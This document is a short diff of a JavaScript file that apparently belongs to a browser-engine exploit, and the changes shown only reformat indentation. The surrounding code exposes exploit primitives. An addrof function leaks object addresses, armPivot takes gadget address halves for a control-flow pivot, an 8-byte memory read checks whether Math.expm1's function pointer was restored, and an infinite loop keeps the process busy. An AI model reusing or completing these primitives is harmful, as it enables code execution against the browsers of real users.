@@ -108,10 +108,10 @@ const api = {
     addrof(which) {
         return addrofRaw(which === "master" ? master
             : which === "victim" ? victim
-            : which === "leak" ? leakObj
-            : which === "pivot" ? pivotObj
-            : which === "expm1" ? Math.expm1
-            : marker_arr);
+                : which === "leak" ? leakObj
+                    : which === "pivot" ? pivotObj
+                        : which === "expm1" ? Math.expm1
+                            : marker_arr);
     },
 
     armPivot(g0lo, g0hi) {
@@ -186,7 +186,7 @@ const api = {
         const back = rd8(mf[0], mf[1]);
         armed = false;
         const ok = (back[0] >>> 0) === (origLo >>> 0)
-                && (back[1] >>> 0) === (origHi >>> 0);
+            && (back[1] >>> 0) === (origHi >>> 0);
         return { restored: ok, mFunction: back, expm1: Math.expm1(1) };
     },
 
@@ -199,7 +199,7 @@ const api = {
 
         const sink = new Uint32Array(4);
         let x = 1;
-        for (;;) {
+        for (; ;) {
             x = (x * 1103515245 + 12345) >>> 0;
             sink[x & 3] = x;
         }
